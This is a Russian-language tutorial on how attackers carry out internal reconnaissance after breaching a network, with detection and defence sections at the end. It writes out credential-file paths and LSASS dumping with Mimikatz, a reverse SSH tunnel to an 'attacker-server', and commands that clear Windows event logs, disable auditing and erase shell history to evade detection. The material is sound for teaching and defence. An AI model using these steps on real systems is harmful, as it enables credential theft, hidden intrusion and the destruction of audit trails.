
---

## Введение: Место внутренней разведки в цепочке кибератаки

**Внутренняя сетевая разведка** (Internal Reconnaissance) — это систематический процесс изучения инфраструктуры изнутри после первоначального проникновения. В отличие от внешней разведки, которая фокусируется на изучении организации извне, внутренняя разведка предполагает, что злоумышленник уже получил точку опоры внутри периметра сети.

Согласно анализу этапов целевых атак, после получения первичного доступа и закрепления в инфраструктуре, злоумышленник начинает **перемещаться внутри периметра**, используя техники внутренней разведки для расширения своего присутствия и поиска ключевых активов.

---

## Этапы внутренней разведки: от первоначального доступа к полному контролю

Внутренняя разведка является не единовременным действием, а циклическим процессом, который повторяется по мере продвижения атакующего по сети. Этот процесс можно разделить на несколько логических этапов.

---

### 1. Первоначальное картирование окружения

После получения доступа к первой системе атакующий начинает с анализа локального окружения:
- Определение операционной системы, версий ПО, установленных приложений
- Анализ сетевых интерфейсов и текущих соединений
- Изучение пользователей системы, их привилегий и активности
- Поиск локальных учетных данных и конфиденциальных данных

---

#### Ключевые системные артефакты и их расположение

**Учетные данные в памяти процессов (LSASS)**:
- **Техника извлечения**: Дамп процесса lsass.exe с использованием Mimikatz, Comsvcs.dll или инструментов типа Task Manager (процесс создания дампа)
- **Конкретные данные**: Хэши NTLM, билеты Kerberos, пароли в plaintext
- **Обнаружение**: Мониторинг доступа к процессу lsass.exe (событие 4663 в Windows с включенным аудитом объектов)

**Файлы конфигурации и истории**:
```sh
# Linux/Unix системы
~/.bash_history          # История команд bash
~/.ssh/config            # Конфигурация SSH
~/.ssh/known_hosts       # Известные SSH хосты
~/.aws/credentials       # Ключи доступа AWS
/etc/passwd, /etc/shadow # Информация о пользователях

# Windows системы
%APPDATA%\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
%USERPROFILE%\Documents\WindowsPowerShell\PSReadline\ConsoleHost_history.txt
%APPDATA%\Microsoft\Windows\Recent\*      # Ярлыки недавних файлов
%WINDIR%\System32\config\SAM              # Хэши паролей (требуются права SYSTEM)
```

**Артефакты приложений**:
- **Браузеры**: Cookies, сохраненные пароли, история (Chrome, Firefox, Edge)
- **Менеджеры паролей**: KeePass, LastPass, 1Password конфигурационные файлы
- **Базы данных**: Конфигурационные файлы с паролями подключения (.my.cnf, pgpass.conf)
- **Облачные утилиты**: Файлы креденшиалов для AWS CLI, Azure CLI, Google Cloud SDK

---

#### Методология анализа артефактов

**Иерархический подход к сбору данных**:

1. **Немедленный сбор**: Данные в оперативной памяти, текущие процессы, сетевые соединения
2. **Быстрый анализ**: Конфигурационные файлы, история команд, временные файлы
3. **Глубокий анализ**: Дампы памяти, полный поиск по файловой системе, анализ журналов

**Использование инструментов для автоматизации**:

- **LaZagne**: Многофункциональный инструмент для извлечения паролей из различных приложений
- **Windows Credential Editor**: Специализированный инструмент для работы с Windows-артефактами
- **Metasploit Post-модули**: Модули для сбора учетных данных, истории браузеров, информации о системе

---

#### Анализ систем контроля доступа и политик безопасности

##### Определение уровня привилегий и возможностей

**Анализ пользовательских прав**:
```powershell
# Windows: Определение групп пользователя
whoami /groups
net user %username% /domain

# Windows: Проверка привилегий
whoami /priv

# Linux: Анализ прав sudo
sudo -l
cat /etc/sudoers

# Linux: Проверка членства в группах
id
groups
```

**Определение политик безопасности**:
```powershell
# Windows: Аудит политик безопасности
secedit /export /cfg sec_policy.cfg
gpresult /z > gpresult.txt

# Анализ брандмауэра Windows
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```

##### Поиск слабых мест в конфигурации

**Общие ошибки конфигурации**:
- Слабые пароли служб (проверка через CrackMapExec)
- Незашифрованные пароли в конфигурационных файлах
- Избыточные права доступа к общим ресурсам
- Отсутствие обновлений безопасности

**Автоматизированные инструменты оценки**:
- **WinPeas/LinPeas**: Скрипты для автоматического поиска векторов эскалации привилегий
- **Windows-Exploit-Suggester**: Анализ установленных обновлений и поиск отсутствующих патчей
- **GPP Password Decryptor**: Расшифровка паролей, найденных в групповых политиках

---

### 2. Сетевое обнаружение и картографирование

На этом этапе происходит активное и пассивное изучение сетевой инфраструктуры:
- Определение диапазонов IP-адресов, подсетей и сетевой топологии
- Обнаружение активных хостов и сетевых устройств
- Составление карты сетевых служб и их взаимосвязей

---

#### Проброс трафика: техники преодоления сетевых ограничений

Когда злоумышленник сталкивается с сетевыми ограничениями (файрволы, прокси, сегментация), используются техники проброса трафика для достижения целевых систем.

##### Основные методы проброса портов

**Локальный проброс портов (Local Port Forwarding)**:
```sh
# SSH Local Port Forwarding (соединяет локальный порт с удаленным ресурсом)
ssh -L 8080:internal-server:80 user@jump-host

# Plink (Windows альтернатива)
plink.exe -L 8080:internal-server:80 user@jump-host -P 22 -pw password

# Использование в Metasploit
meterpreter > portfwd add -L 0.0.0.0 -l 8080 -p 80 -r internal-server
```

**Дистанционный проброс портов (Remote Port Forwarding)**:
```sh
# SSH Remote Port Forwarding (открывает порт на удаленной системе)
ssh -R 2222:localhost:22 user@attacker-server

# Полезно для получения доступа к системам без публичного IP
# Создает обратный туннель для управления
```

**Динамический проброс портов (Dynamic Port Forwarding)**:
```sh
# Создание SOCKS прокси через SSH
ssh -D 1080 user@compromised-host

# Настройка инструментов на использование SOCKS прокси
proxychains nmap -sT -Pn 10.0.5.0/24
```

##### Продвинутые техники проброса трафика

**Использование HTTP/HTTPS туннелей**:
- **Chisel**: Современный инструмент для создания зашифрованных туннелей через HTTP
- **reGeorg/Neo-reGeorg**: Скрипты для создания туннелей через веб-шеллы
- **HTRAN**: Инструмент для преобразования трафика между разными протоколами

**DNS туннелирование**:
- **dnscat2**: Создание полнофункционального канала связи через DNS-запросы
- **IODINE**: Инструмент для туннелирования IPv4-трафика через DNS-серверы
- **Особенности**: Работает в сетях, где разрешен только DNS-трафик

**ICMP туннелирование**:
- **ptunnel**: Инструмент для туннелирования TCP-трафика через ICMP-пакеты (ping)
- **Применение**: Обход сетевых ограничений, разрешающих только ICMP-трафик

##### Таблица сравнения методов проброса трафика

|Метод|Протокол|Обнаружаемость|Скорость|Надежность|Типичное применение|
|---|---|---|---|---|---|
|SSH туннели|TCP/22|Низкая|Высокая|Высокая|Длительные сессии, управление|
|DNS туннелирование|UDP/53|Средняя|Низкая|Средняя|Обход строгих файрволов|
|HTTP/HTTPS туннели|TCP/80,443|Низкая|Средняя|Высокая|Веб-прокси, обход DPI|
|ICMP туннели|ICMP|Высокая|Низкая|Низкая|Экстренные каналы связи|
|Спец. инструменты (Chisel)|Любой|Низкая|Высокая|Высокая|Гибкие сценарии|

---

### 3. Анализ доменной среды (для сетей Windows)

В корпоративных средах с Active Directory этот этап становится критически важным:
- Перечисление пользователей, групп, компьютеров и политик домена
- Анализ связей и отношений доверия между объектами домена
- Выявление привилегированных учетных записей и критических ресурсов

---

#### Специализированные техники для Active Directory

В средах Windows с Active Directory существуют специализированные инструменты для эффективной разведки:

**PowerView** — часть фреймворка PowerSploit, работающая через LDAP-протокол. В отличие от встроенных утилит (net.exe), PowerView позволяет получать информацию об объектах AD более гибко и полно. Его использование можно обнаружить по событиям LDAP 1644 на контроллере домена или по анализу сетевого трафика, так как LDAP — это протокол без шифрования по умолчанию.

**BloodHound** — инструмент, визуализирующий отношения между объектами Active Directory в виде графа. Он помогает быстро определить самые эффективные пути к привилегированным учетным записям, показывая кратчайший маршрут от текущей позиции атакующего до доменных администраторов.

**SPN-сканирование** — метод получения информации о сервисах из самого Active Directory без необходимости сканирования портов каждой машины. Это менее заметный способ, чем массовое сканирование Nmap, так как требует всего одного LDAP-запроса.

---

#### Перечисление WMI

Инструментарий управления Windows (WMI) предоставляет богатые возможности для сбора информации о системе. С помощью WMI можно перечислять практически все аспекты системы, от оборудования до запущенных процессов. Пример PowerShell-команды для получения информации о логических дисках:

```powershell
Get-WmiObject -Class "Win32_LogicalDisk"
```

Эта команда возвращает коллекцию объектов, содержащих информацию о всех логических дисках системы.

---

### 4. Поиск векторов для эскалации привилегий

На основе собранной информации атакующий определяет потенциальные пути повышения привилегий:
- Поиск уязвимостей в установленном ПО и операционных системах
- Анализ конфигурационных ошибок и слабых мест
- Выявление систем с высоким уровнем привилегий

---

### 5. Планирование и выполнение перемещения (Lateral Movement)

Финальный этап включает планирование и выполнение перемещения к целевым системам:
- Выбор методов перемещения на основе собранных данных
- Подбор учетных данных для аутентификации на других системах
- Определение оптимальной последовательности действий для достижения цели

#### Анализ сетевой инфраструктуры изнутри

##### Определение сетевой топологии

```sh
# Анализ маршрутизации
route print                  # Windows
ip route show                # Linux
netstat -rn                  # Альтернативный вариант

# Исследование соседей по сети
arp -a                       # Windows/Linux (ARP таблица)
ip neighbor show             # Linux (современный аналог)

# Обнаружение сетевых интерфейсов
ipconfig /all                # Windows
ifconfig -a                  # Linux (устаревшее)
ip addr show                 # Linux (современное)
```

##### Идентификация критических сетевых сервисов

**Сервисы для Active Directory**:
- **Domain Controllers**: LDAP (389), LDAPS (636), Kerberos (88), DNS (53)
- **Службы синхронизации времени**: NTP (123 UDP)
- **Службы управления групповыми политиками**: SMB (445), RPC (135)

**Сервисы для управления системами**:
- **Удаленное управление**: RDP (3389), SSH (22), WinRM (5985, 5986)
- **Системы мониторинга**: SNMP (161), WMI (135, 445)
- **Базы данных**: MSSQL (1433), MySQL (3306), PostgreSQL (5432)

##### Техники пассивного сбора сетевой информации

**Сниффинг трафика в промисуативном режиме**:
```sh
# Настройка интерфейса в режиме захвата всех пакетов
ifconfig eth0 promisc        # Linux (устаревшее)
ip link set eth0 promisc on  # Linux (современное)

# Использование tcpdump для захвата трафика
tcpdump -i eth0 -w capture.pcap host 10.0.5.12 and port 445
tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

**Анализ сетевых соединений текущей системы**:

```sh
# Windows
netstat -ano | findstr ESTABLISHED  # Активные соединения
netstat -ano | findstr LISTENING    # Прослушивающие порты

# Linux
netstat -tulpn                      # Все прослушивающие порты с процессами
ss -tulpn                           # Современная альтернатива netstat
lsof -i                             # Все сетевые соединения с процессами
```

#### Техники избегания обнаружения во время разведки

##### Скрытие следов в журналах событий

**Манипуляции с журналами Windows**:
```sh
# Очистка журналов событий
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Отключение аудита для определенных событий
auditpol /set /category:"Account Logon" /success:disable /failure:disable

# Избирательное удаление записей (требуются повышенные привилегии)
```

**Очистка истории команд**:
```sh
# Linux
history -c                  # Очистка текущей сессии
rm ~/.bash_history          # Удаление файла истории
ln -s /dev/null ~/.bash_history  # Перенаправление истории в /dev/null

# PowerShell (Windows)
Remove-Item (Get-PSReadlineOption).HistorySavePath
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

### Использование легитимных административных инструментов

**Живая-из-земли (Living-off-the-land) техника**:
- Использование встроенных системных инструментов: PowerShell, WMI, VBScript
- Загрузка скриптов в память без записи на диск (IEX в PowerShell)
- Использование легитимных административных протоколов: WinRM, PsExec, RDP

**Обфускация сетевого трафика**:
- Разделение данных на мелкие пакеты
- Использование стандартных портов (443 для HTTPS)
- Шифрование всего трафика, даже в внутренней сети
- Имитация легитимного трафика приложений

---

## Ключевые методы и инструменты внутренней разведки

---

### Пассивные методы сбора информации

Пассивные методы минимизируют риск обнаружения, так как не предполагают активного взаимодействия с целевыми системами.

**Анализ сетевого трафика (сниффинг)** позволяет перехватывать и анализировать данные, передаваемые по сети. Как отмечается в исследованиях, пассивный сниффинг особенно эффективен в сетях, использующих хабы, где все устройства разделяют общий канал связи. Для этого используются такие инструменты как **Wireshark** и **tcpdump**, которые могут декодировать различные протоколы (DNS, ARP, DHCP, TCP) для извлечения ценной информации.

**Анализ локальных конфигураций и данных** включает изучение файлов hosts, ARP-кэшей, конфигурационных файлов приложений и системных логов без генерации дополнительного сетевого трафика.

---

### Активные методы сканирования и перечисления

Активные методы предполагают прямое взаимодействие с целевыми системами, что увеличивает риск обнаружения, но предоставляет более полную информацию.

**Сканирование портов** является фундаментальной техникой внутренней разведки. Nmap предлагает множество методов сканирования, каждый со своими особенностями:
- **SYN-сканирование (-sS)** — полуоткрытое сканирование, относительно незаметное, не завершающее TCP-соединение
- **TCP-сканирование (-sT)** — полное установление соединения, более заметное, но работающее без привилегий root
- **UDP-сканирование (-sU)** — важно для обнаружения UDP-сервисов (DNS, SNMP, DHCP), но медленное и ненадежное

**Перечисление служб и их версий** помогает определить потенциально уязвимые сервисы. Комбинация сканирования с опцией **-sV** в Nmap позволяет определить версии запущенных служб.

---

## Конкретные техники и их применение

---

### Анализ сессий пользователей

Определение того, какие пользователи в данный момент работают на каких системах, критически важно для планирования перемещения по сети. Техника **Remote Sessions Enumeration** позволяет получать список активных сессий на удаленных системах.

Для обнаружения этой активности можно отслеживать два типа событий: успешный вход на удаленную систему (событие 4624 с типом входа 3) и доступ к сетевой папке IPC$ с обращением к каналу **srvsvc**, который используется протоколом Server Service Remote Protocol для получения административной информации.

---

### Использование DCOM для разведки

Distributed Component Object Model (DCOM) позволяет выполнять код на удаленных системах. Атакующие могут использовать стандартные объекты DCOM, такие как Microsoft Management Console (MMC) 2.0, для запуска инструментов разведки на удаленных машинах Это особенно эффективно, когда у атакующего уже есть учетные данные пользователя, который ранее использовал DCOM.

---

## Нюансы и практические рекомендации

---

### Управление риском обнаружения

Один из ключевых аспектов внутренней разведки — баланс между получением информации и риском обнаружения. Следует учитывать:
1. **Временные параметры** — выполнение сканирований в периоды низкой активности (ночью, в выходные) может снизить вероятность обнаружения.
2. **Интенсивность сканирования** — агрессивное сканирование может вызвать срабатывание систем обнаружения вторжений (IDS).
3. **Использование легитимных протоколов** — инструменты вроде PowerView, работающие через стандартный LDAP-трафик, менее подозрительны, чем массовые сканирования портов.

---

## Интеграция техник в полный цикл атаки

### Последовательность действий при внутренней разведке

1. **Первоначальная оценка**:
    - Сбор информации о текущей системе (hostname, IP, пользователь, привилегии)
    - Определение сетевого окружения (шлюзы, DNS, домен)
2. **Пассивный сбор данных**:
    - Сниффинг сетевого трафика
    - Анализ ARP-таблиц и кэшей DNS
    - Изучение общих ресурсов и сетевых служб
3. **Целевой активный сбор**:
    - Сканирование определенных подсетей или систем
    - Перечисление пользователей и групп
    - Поиск общих ресурсов и критических данных
4. **Углубленный анализ**:
    - Извлечение учетных данных из памяти и хранилищ
    - Анализ установленного ПО и обновлений
    - Определение отношений доверия в домене
5. **Подготовка к перемещению**:
    - Создание туннелей для обхода сетевых ограничений
    - Подготовка payload для следующих систем
    - Очистка следов деятельности

### Комбинация техник для конкретных сценариев

**Сценарий 1: Работа в сегментированной сети**:

1. Использование DNS туннелирования для обхода ограничений
2. Поиск систем с двумя сетевыми интерфейсами (хостов-бастионов)
3. Установка прокси на пограничных системах для доступа к другим сегментам

**Сценарий 2: Атака на домен Active Directory**:

1. Сбор информации о домене с помощью PowerView
2. Поиск уязвимостей в конфигурации (Kerberoasting, AS-REP Roasting)
3. Использование BloodHound для определения оптимального пути атаки
4. Перемещение к контроллерам домена через компрометацию привилегированных аккаунтов

---

### Детектирование активностей внутренней разведки

Для специалистов по защите критически важно уметь обнаруживать признаки внутренней разведки:
1. **Мониторинг LDAP-запросов** — необычно большие или частые LDAP-запросы могут указывать на использование PowerView или подобных инструментов.
2. **Анализ сетевого трафика на предмет сканирования портов** — последовательные обращения к множеству портов с одного источника.
3. **Отслеживание использования DCOM и WMI** — несанкционированное или аномальное использование этих технологий для удаленного выполнения кода.
4. **Мониторинг событий PowerShell** — расширенное логирование PowerShell (событие 4104) может помочь обнаружить выполнение скриптов разведки.

---

## Рекомендации по построению защиты

На основе понимания методов внутренней разведки можно предложить следующие меры защиты:

|**Уровень защиты**|**Конкретные меры**|**Эффективность против**|
|---|---|---|
|**Сегментация сети**|Микросетевая сегментация, VLAN|Ограничение перемещения, сдерживание сниффинга|
|**Мониторинг**|Системы SIEM, анализ сетевого трафика, аудит событий AD|Обнаружение аномальных запросов, сканирования|
|**Конфигурация**|Отключение ненужных служб, регулярное обновление, принцип минимальных привилегий|Уменьшение поверхности атаки|
|**Шифрование**|IPSec, HTTPS, шифрование чувствительных протоколов|Защита от сниффинга трафика|
|**Аудит и тестирование**|Регулярные тесты на проникновение, purple team упражнения|Выявление слабых мест до атаки|

Как показывают исследования, даже хорошо защищенный периметр в 98% случаев может быть преодолен, поэтому особое внимание следует уделять **обнаружению активности внутри сети**, а не только защите периметра. Системы, способные анализировать сетевой трафик и выявлять аномалии, позволяют обнаруживать злоумышленников на ранних этапах, когда ущерб еще минимален.

---

